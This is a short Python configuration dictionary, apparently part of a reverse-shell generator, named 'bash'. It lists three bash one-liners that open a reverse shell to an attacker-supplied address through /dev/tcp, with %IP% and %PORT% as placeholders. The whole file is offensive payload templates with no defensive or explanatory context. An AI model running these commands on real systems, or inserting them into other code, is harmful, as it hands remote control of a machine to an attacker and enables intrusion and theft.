conf = {
    "name": "bash",
    "templates": [
        "bash -i >& /dev/tcp/%IP%/%PORT% 0>&1",
        "0<&196;exec 196<>/dev/tcp/%IP%/%PORT%; sh <&196 >&196 2>&196",
        "/bin/bash -l > /dev/tcp/%IP%/%PORT% 0<&1 2>&1",
    ]
}